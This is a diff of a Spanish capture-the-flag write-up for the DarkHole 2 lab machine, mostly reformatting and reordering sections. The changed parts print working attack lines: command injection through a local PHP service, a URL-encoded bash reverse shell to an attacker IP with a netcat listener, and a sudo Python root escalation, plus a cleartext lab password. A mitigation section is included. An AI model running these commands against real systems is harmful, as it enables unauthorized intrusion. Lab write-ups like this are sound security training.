@@ -1,5 +1,5 @@
 ---
-title: DarkHole 2 - Writeup
+title: "VulnHub: darkhole_2"
 date: 2025-10-09
 tags:
   - writeup
@@ -31,8 +31,13 @@ references:
 - Capturar las flags user.txt y root.txt
 
 ---
-## Preparativos
+## Preparativos:
 - Máquina Virtual en VMWare.
+### Pistas:
+- El repositorio Git contenía 3 commits; solo el segundo contenía credenciales
+- La tabla ssh en la BD estaba específicamente diseñada para almacenar creds de acceso remoto
+- El servicio PHP en puerto 9999 no requería autenticación ni validaba comandos
+- El usuario losy tenía contraseña débil y permisos sudo peligrosos
 
 ---
 # Informe General:
@@ -327,7 +332,7 @@ Comando para ver kernel:
 
 uname -a
 
-Resultado: Linux darkhole 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
+Resultado: Linux darkhole 5.4.0-81-generic 91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
 
 Comando para ver versión del SO:
 
@@ -403,8 +408,9 @@ Exploración del directorio home:
 #### Explotación del Servicio Interno
 
 Prueba de concepto con curl:
-
+```
 curl "http://localhost:9999/?cmd=id"
+```
 
 ![[darkhole_2.24.png]]
 
@@ -413,41 +419,44 @@ El comando se ejecuta como usuario losy, confirmando RCE.
 #### Reverse Shell como losy
 
 Listener en máquina atacante:
-
+```
 nc -lvnp 443
+```
 
 ![[darkhole_2.25.png]]
 
 Payload desde consola de jehad (URL encoded):
-
+```
 curl "http://localhost:9999/?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/172.16.23.1/443%200%3E%261'"
+```
 
 ![[darkhole_2.26.png]]
-
-Shell inversa obtenida como losy.
+	Shell inversa obtenida como losy.
 
 #### Estabilización de TTY
 
 Comandos para estabilizar la shell:
 
+```
 /usr/bin/script -qc /bin/bash /dev/null
-
-Luego CTRL+Z y ejecutar:
-
+```
+	Luego CTRL+Z y ejecutar:
+```
 stty raw -echo; fg
+```
 
 Finalmente:
-
+```
 export TERM=xterm
+```
 
 #### Análisis del Historial de losy
 
 Comando:
-
+```
 history
-
+```
 ![[darkhole_2.27.png]]
-
 > [!danger] Información Crítica en Historial
 > Comandos encontrados:
 > 1. sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
@@ -462,9 +471,10 @@ El usuario losy tiene permisos sudo para ejecutar Python como root.
 
 Comando para obtener shell root:
 
+```
 sudo python3 -c 'import os; os.system("/bin/sh")'
-
-Contraseña usada: gang
+```
+	Contraseña usada: gang
 
 Shell de root obtenida. Flag root.txt capturada en /root.
 
@@ -488,20 +498,6 @@ Flags capturadas:
 > Todos los comandos, payloads y respuestas del servidor fueron documentados con capturas de pantalla y timestamps para reproducibilidad.
 
 ---
-
-## Conclusiones
-
-**Lecciones aprendidas:** La exposición de repositorios Git con historial completo es una vulnerabilidad crítica que puede filtrar credenciales hardcodeadas. La inyección SQL manual sigue siendo efectiva cuando la validación de entradas es nula. Los servicios internos mal configurados y el historial de bash sin limpiar son vectores de escalada comunes.
-
-**Complejidad real vs marcada:** La dificultad media es apropiada. Requiere conocimientos sólidos de enumeración web, SQLi manual y pensamiento lateral para identificar servicios locales.
-
-**Mejoras para próximos writeups:** Incluir timings de cada fase, automatizar la extracción de datos con sqlmap como verificación paralela, y documentar intentos fallidos para mostrar el proceso real de pentesting.
-
-> [!note] Mapa mental
-> Técnicas relacionadas: [[Git-Enumeration]], [[SQLi-Manual]], [[SQLi-Union-Based]], [[Linux-Internal-Services]], [[Python-Sudo-Privesc]], [[SSH-Lateral-Movement]]
-
----
-
 ## Mitigación y Recomendaciones
 
 **Repositorio Git expuesto:** Eliminar completamente el directorio .git de servidores en producción o bloquear el acceso mediante .htaccess. Nunca commitear credenciales en código fuente; usar variables de entorno o gestores de secretos.
@@ -515,7 +511,16 @@ Flags capturadas:
 **Abuso de sudo con Python:** Restringir comandos sudo a scripts específicos sin capacidad de importar módulos arbitrarios. Revisar configuración de sudoers y eliminar permisos innecesarios. Implementar políticas de seguridad con SELinux o AppArmor.
 
 ---
+## Conclusiones
 
+**Lecciones aprendidas:** La exposición de repositorios Git con historial completo es una vulnerabilidad crítica que puede llevar a la filtración de credenciales. La inyección SQL manual sigue siendo efectiva cuando la validación de entradas es nula. Los servicios internos mal configurados y el historial de bash sin limpiar son vectores de escalada comunes.
+
+**Complejidad real vs marcada:** La dificultad media es apropiada. Requiere conocimientos sólidos de enumeración web, SQLi manual y pensamiento lateral para identificar servicios locales.
+
+> [!note] Mapa mental
+> Técnicas relacionadas: [[Git-Enumeration]], [[SQLi-Manual]], [[SQLi-Union-Based]], [[Linux-Internal-Services]], [[Python-Sudo-Privesc]], [[SSH-Lateral-Movement]]
+
+---
 ## Herramientas Utilizadas
 
 - arp-scan
@@ -528,21 +533,6 @@ Flags capturadas:
 - ssh
 - htop
 - netstat
-
-Checklist de flujo:
-- [x] Reconocimiento de red
-- [x] Escaneo de puertos
-- [x] Enumeración web
-- [x] Análisis de repositorio Git
-- [x] Explotación de credenciales
-- [x] Inyección SQL manual
-- [x] Obtención de shell SSH
-- [x] Enumeración interna
-- [x] Identificación de servicios locales
-- [x] Reverse shell lateral
-- [x] Escalada a root via sudo
-- [x] Captura de flags
-- [x] Documentación y mitigación
 
 ---
 
@@ -586,13 +576,6 @@ stty raw -echo; fg
 export TERM=xterm
 export SHELL=bash
 stty rows 38 columns 116
-
-### Notas Rápidas
-
-- El repositorio Git contenía 3 commits; solo el segundo contenía credenciales
-- La tabla ssh en la BD estaba específicamente diseñada para almacenar creds de acceso remoto
-- El servicio PHP en puerto 9999 no requería autenticación ni validaba comandos
-- El usuario losy tenía contraseña débil y permisos sudo peligrosos
 
 ---
 
